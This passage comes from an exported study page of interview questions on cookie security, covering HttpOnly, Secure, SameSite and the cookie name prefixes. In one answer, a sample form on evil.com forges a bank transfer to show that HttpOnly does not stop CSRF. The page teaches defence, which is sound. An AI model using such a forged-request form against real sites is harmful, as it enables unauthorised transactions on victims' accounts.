// Only sent over HTTPS - encrypted transmission</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-801b-a15e-f22401461dd1"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8073-9586-fae740490a83" class=""><strong>Q3: Does HttpOnly protect against CSRF attacks?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80e2-a695-d5a3b41b655a" class=""><strong>Answer:</strong> <strong>No, HttpOnly does NOT protect against CSRF attacks.</strong></p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80dc-a14e-f17fb77ee0b9" class="">This is a common misconception. HttpOnly only prevents JavaScript from accessing cookies, but CSRF attacks don&#x27;t require JavaScript access to cookies.</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8076-862d-fa2cd6226749" class=""><strong>How CSRF works:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-807f-b890-e185c45830d7" class="numbered-list" start="1"><li>User is logged into a website (has session cookie)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80dd-bf14-f76115d8d855" class="numbered-list" start="2"><li>User visits attacker&#x27;s website</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8084-b96c-ff840511b5a9" class="numbered-list" start="3"><li>Attacker&#x27;s website submits a form to the target website</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-804c-b39d-f5092620bfdd" class="numbered-list" start="4"><li>Browser automatically includes the user&#x27;s cookies with the request</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-807f-bbc6-dac79317ac21" class="numbered-list" start="5"><li>Target website processes the request with valid cookies</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80a0-a953-dfb3c570b90e" class="numbered-list" start="6"><li>Attack succeeds</li></ol></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8024-a6c5-e7289d308b89" class=""><strong>Why HttpOnly doesn&#x27;t help:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8020-bd25-c9e51fc95af4" class="bulleted-list"><li style="list-style-type:disc">CSRF attacks rely on the browser automatically sending cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80ea-8c3e-cdb8dd627d44" class="bulleted-list"><li style="list-style-type:disc">HttpOnly only prevents JavaScript access, not automatic cookie sending</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-809d-ab09-f34f29a4e446" class="bulleted-list"><li style="list-style-type:disc">The browser still sends HttpOnly cookies with requests automatically</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d5-89d8-f084604ddc98" class=""><strong>What actually protects against CSRF:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8021-b8e1-e08e12f3c0e3" class="bulleted-list"><li style="list-style-type:disc"><code>SameSite</code> attribute (Strict or Lax)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80c5-a895-ef4eb165581a" class="bulleted-list"><li style="list-style-type:disc">CSRF tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8083-a2ed-d190b7c3d2e3" class="bulleted-list"><li style="list-style-type:disc">Custom headers (e.g., X-Requested-With)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80b9-9fab-ded4f6f7725e" class="bulleted-list"><li style="list-style-type:disc">Double-submit cookies</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80c2-b77d-c5c82472e821" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-808b-bc69-ec696e3e779c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Cookie with HttpOnlySet-Cookie: sessionId=abc123; HttpOnly; Secure

// CSRF attack still works:// Attacker&#x27;s form on evil.com:
&lt;form action=&quot;https://bank.com/transfer&quot; method=&quot;POST&quot;&gt;
  &lt;input name=&quot;to&quot; value=&quot;attacker&quot;&gt;
  &lt;input name=&quot;amount&quot; value=&quot;10000&quot;&gt;
&lt;/form&gt;

// Browser automatically sends cookie:
POST https://bank.com/transfer HTTP/1.1
Cookie: sessionId=abc123  // Still sent automatically!

// HttpOnly did NOT prevent this
</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80c3-a59d-d9e9588c77ad"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-8067-a25a-e032954c35ce" class=""><strong>Q4: What is the SameSite attribute and how does it protect against CSRF?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8067-862d-d8dc65505309" class=""><strong>Answer:</strong> The <code>SameSite</code> attribute controls whether cookies are sent with cross-site requests, providing protection against CSRF attacks.</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-807f-8e69-febbd559646f" class=""><strong>Values:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8063-aad5-d99a2418ffe4" class="numbered-list" start="1"><li><code><strong>SameSite=Strict</strong></code>: Cookie sent only with same-site requests<div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8053-8fcf-c3c30dda5b2a" class="bulleted-list"><li style="list-style-type:disc">Maximum CSRF protection</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-809d-bfd6-fd548288678b" class="bulleted-list"><li style="list-style-type:disc">Cookie NOT sent with any cross-site requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8085-a7e6-d80202c3889c" class="bulleted-list"><li style="list-style-type:disc">May require re-authentication when coming from external links</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80dc-80a5-ee8b63a7e3a6" class="numbered-list" start="2"><li><code><strong>SameSite=Lax</strong></code> (default in modern browsers): Cookie sent with same-site requests and top-level GET navigations<div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8010-b154-dc14e23121f7" class="bulleted-list"><li style="list-style-type:disc">Good balance of security and usability</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8019-9c7b-e39a578f69b5" class="bulleted-list"><li style="list-style-type:disc">Cookie NOT sent with cross-site POST requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80a7-a910-e608a794f195" class="bulleted-list"><li style="list-style-type:disc">Cookie IS sent when user clicks external link (GET navigation)</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-803c-9afc-e38a8461dcf3" class="numbered-list" start="3"><li><code><strong>SameSite=None</strong></code>: Cookie sent with both same-site and cross-site requests<div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80a9-84d3-f82d961d0725" class="bulleted-list"><li style="list-style-type:disc">Requires <code>Secure</code> attribute</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8047-9f80-fd32d5ebc3c6" class="bulleted-list"><li style="list-style-type:disc">No CSRF protection</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8079-9c32-c2682750bfc1" class="bulleted-list"><li style="list-style-type:disc">Used for third-party integrations</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d0-b7b3-f00b80807138" class=""><strong>How it prevents CSRF:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80d0-a0db-ee2904d52942" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// With SameSite=StrictSet-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

// CSRF attack from evil.com:POST https://bank.com/transfer HTTP/1.1Cookie: (NOT SENT)// Browser refuses to send cookie// Attack fails - no cookie sent</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-80e8-be06-e0452638e9a0"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80cb-abce-cbf84566613c" class=""><strong>Q5: What are cookie prefixes (__Secure- and __Host-)?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80fe-bf74-c6f27d852698" class=""><strong>Answer:</strong> Cookie prefixes provide additional security by enforcing constraints at the browser level.</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d1-8b2e-ee697b080fdb" class=""><code><strong>__Secure-</strong></code><strong> prefix:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8045-b0ec-d606a7e32f9b" class="bulleted-list"><li style="list-style-type:disc">Cookie name must start with <code>__Secure-</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8032-a405-ee0ec8d63edb" class="bulleted-list"><li style="list-style-type:disc">Must have <code>Secure</code> attribute</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-807e-a938-c4a14de304a7" class="bulleted-list"><li style="list-style-type:disc">Must be set from HTTPS origin</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-804f-a01d-e1971bb921e5" class="bulleted-list"><li style="list-style-type:disc">Prevents accidental insecure cookie setting</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80f7-ae7f-caff5ad0d7a8" class=""><code><strong>__Host-</strong></code><strong> prefix:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80f0-9b29-d1e5008704d6" class="bulleted-list"><li style="list-style-type:disc">Cookie name must start with <code>__Host-</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-800a-8fc6-d17820919bf0" class="bulleted-list"><li style="list-style-type:disc">Must have <code>Secure</code> attribute</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8036-97fa-e0e6abc59261" class="bulleted-list"><li style="list-style-type:disc">Must have <code>Path=/</code></li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8067-894a-eab4a872608b" class="bulleted-list"><li style="list-style-type:disc">Must NOT have <code>Domain</code> attribute</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8003-a904-fdf88ab43174" class="bulleted-list"><li style="list-style-type:disc">Must be set from HTTPS origin</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80d3-aed3-ede184286335" class="bulleted-list"><li style="list-style-type:disc">Prevents subdomain cookie access</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8019-bc26-c1459c2d7de8" class="bulleted-list"><li style="list-style-type:disc">Maximum isolation</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-805c-98cb-ee53b9be3759" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-8038-b60f-f6d0cf13dde0" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// __Secure- prefixSet-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly
// Browser enforces Secure attribute// __Host- prefixSet-Cookie: __Host-sessionId=abc123; Secure; Path=/; HttpOnly
// Browser enforces no Domain, Path=/, and Secure// Prevents subdomain.example.com from accessing cookie set by example.com</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8035-9ef7-d2f230d1e7c9"/></div><div style="display:contents" dir="auto"><h2 id="2b2562ad-76f0-80b6-82e2-d9343b83d44e" class=""><strong>Scenario-Based Questions</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80a0-a735-dcc1f5705b49" class=""><strong>Q6: How would you configure cookies to prevent both XSS and CSRF attacks?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80a6-8b44-d18b0f6e5f19" class=""><strong>Answer:</strong> Use a combination of <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite</code> attributes:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-801e-a4ba-e10b8a8f6c4f" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80fb-b46e-ea28e5b56f0a" class=""><strong>Breakdown:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8058-bfd0-db7c7f4fb069" class="bulleted-list"><li style="list-style-type:disc"><code>HttpOnly</code>: Prevents JavaScript access (XSS protection)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8031-b4e4-ed8bb36c85c7" class="bulleted-list"><li style="list-style-type:disc"><code>Secure</code>: HTTPS-only transmission</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80c9-838f-dc8fbed0774c" class="bulleted-list"><li style="list-style-type:disc"><code>SameSite=Strict</code>: Prevents cross-site cookie sending (CSRF protection)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-803a-baa6-f407a0a6e5d6" class="bulleted-list"><li style="list-style-type:disc"><code>__Host-</code> prefix: Additional security enforcement</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80ca-9a1e-cdd57e56b4a2" class="bulleted-list"><li style="list-style-type:disc"><code>Path=/</code>: Site-wide availability</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8060-b26c-cabc8379a5fe" class="bulleted-list"><li style="list-style-type:disc"><code>Max-Age=3600</code>: 1-hour expiration</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8088-9418-e93e8906ac31" class=""><strong>Alternative (more user-friendly):</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80b6-b38e-f5189d568f03" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Secure-sessionId=abc123; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600
</code></pre></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80e1-9837-fc587ecc2f51" class="bulleted-list"><li style="list-style-type:disc"><code>SameSite=Lax</code> provides CSRF protection while allowing external links to work</li></ul></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8018-abe0-de6d1c16b9c8"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80c6-af5e-f84e8a7f236d" class=""><strong>Q7: A user reports that they get logged out when clicking links from email. What could be the cause?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-801d-8289-d4ec9c9e7c6d" class=""><strong>Answer:</strong> This is likely caused by <code>SameSite=Strict</code> on the session cookie.</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8002-acac-d2ecf7bbde74" class=""><strong>Explanation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80b3-ae45-c87fefabd085" class="bulleted-list"><li style="list-style-type:disc"><code>SameSite=Strict</code> prevents cookies from being sent with ANY cross-site requests</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-802d-b4bc-dea544933f51" class="bulleted-list"><li style="list-style-type:disc">When a user clicks a link from email (external site), the browser treats it as a cross-site navigation</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8040-bfe8-c13f577799a9" class="bulleted-list"><li style="list-style-type:disc">The session cookie is not sent, so the user appears logged out</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-800e-a386-d36e515678c5" class=""><strong>Solutions:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8094-9a44-d9c414113304" class="numbered-list" start="1"><li><strong>Change to SameSite=Lax</strong> (recommended for most applications):<div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-805a-96e9-c22e92676654" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: sessionId=abc123; Secure; HttpOnly; SameSite=Lax
</code></pre></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8094-a595-ce40a5106434" class="bulleted-list"><li style="list-style-type:disc">Still provides CSRF protection (blocks cross-site POST)</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-807f-a019-e8c118646c76" class="bulleted-list"><li style="list-style-type:disc">Allows cookies with top-level GET navigations (external links work)</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8072-a645-d5708d743708" class="numbered-list" start="2"><li><strong>Keep Strict but implement proper redirects</strong>:<div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8062-b0d5-cf2d48e5ab4b" class="bulleted-list"><li style="list-style-type:disc">Email links go to a landing page first</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8013-9bde-ecf0be3d52ca" class="bulleted-list"><li style="list-style-type:disc">Landing page redirects to the actual destination</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80e5-8bb7-fdad81ba0f7f" class="bulleted-list"><li style="list-style-type:disc">Second navigation is same-site, so cookie is sent</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80c8-8107-d6f78024ab4f" class="numbered-list" start="3"><li><strong>Use separate cookies</strong>:<div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80b0-8d59-f7d31dd26d9b" class="bulleted-list"><li style="list-style-type:disc">Strict cookie for sensitive operations</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-8056-aacf-e7aa857ead01" class="bulleted-list"><li style="list-style-type:disc">Lax cookie for general session</li></ul></div></li></ol></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8066-848e-defc83cda760"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-801a-9a95-daad66fe9962" class=""><strong>Q8: Your application needs to work with third-party widgets. How do you configure cookies?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8096-a661-daad0f70e420" class=""><strong>Answer:</strong> For third-party integrations, you need <code>SameSite=None</code> with <code>Secure</code>:</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80ce-b900-cb13b7ce94a2" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Set-Cookie: __Secure-widgetSession=abc123; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800
</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-805d-9783-dd09a02e10b3" class=""><strong>Important considerations:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8035-9447-c0fb2f8502e3" class="numbered-list" start="1"><li><code><strong>SameSite=None</strong></code><strong> requires </strong><code><strong>Secure</strong></code>: Modern browsers enforce this</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8074-aa69-cf79e9410084" class="numbered-list" start="2"><li><strong>No CSRF protection</strong>: <code>SameSite=None</code> allows cross-site requests</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8040-869f-d868b37981a2" class="numbered-list" start="3"><li><strong>Use CSRF tokens</strong>: Implement additional CSRF protection</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80cc-90ce-f1761cf12e31" class="numbered-list" start="4"><li><strong>Browser compatibility</strong>: Some browsers block third-party cookies by default</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80d9-8f3b-e08845de1722" class="numbered-list" start="5"><li><strong>Alternative approaches</strong>: Consider OAuth2, token-based auth, or iframe postMessage</li></ol></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-800c-a4a3-dc8439313101" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-809d-8b3c-f994e213a482" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Widget cookie (allows cross-site)Set-Cookie: __Secure-widgetSession=abc123; Secure; HttpOnly; SameSite=None; Path=/

// Main session cookie (same-site only)Set-Cookie: __Host-sessionId=xyz789; Secure; HttpOnly; SameSite=Strict; Path=/
</code></pre></div><div style="display:contents" dir="auto"><hr id="2b2562ad-76f0-8057-ac6b-c091e3dbd0d0"/></div><div style="display:contents" dir="auto"><h3 id="2b2562ad-76f0-80c6-a359-dadd4daea043" class=""><strong>Q9: You discover that your session cookies are being sent over HTTP. What&#x27;s wrong?</strong></h3></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80bd-9326-e14b392e270c" class=""><strong>Answer:</strong> The cookies are missing the <code>Secure</code> attribute.</p></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80f5-9a32-c2fc0a028a83" class=""><strong>Problem:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-80e7-8f56-fa4a2f8a23c9" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Vulnerable configurationSet-Cookie: sessionId=abc123; HttpOnly
// Missing Secure attribute - sent over HTTP</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-805b-8346-e1743707579a" class=""><strong>Solution:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b2562ad-76f0-806b-8ec5-e13aeceb9f40" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Secure configurationSet-Cookie: sessionId=abc123; HttpOnly; Secure
// Only sent over HTTPS</code></pre></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-80d0-9afb-d651a0654a06" class=""><strong>Additional checks:</strong></p></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80e6-9fd6-dd4469648d7d" class="numbered-list" start="1"><li>Ensure your application is served over HTTPS</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8077-9db9-ff2cbb225d2a" class="numbered-list" start="2"><li>Check for mixed content (HTTP resources on HTTPS pages)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-8093-a125-ce084c9e17fe" class="numbered-list" start="3"><li>Verify server configuration (some frameworks require explicit Secure setting)</li></ol></div><div style="display:contents" dir="auto"><ol type="1" id="2b2562ad-76f0-80cd-899c-dbcd4ad9a1d9" class="numbered-list" start="4"><li>Use <code>__Secure-</code> prefix to enforce Secure attribute:<div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" 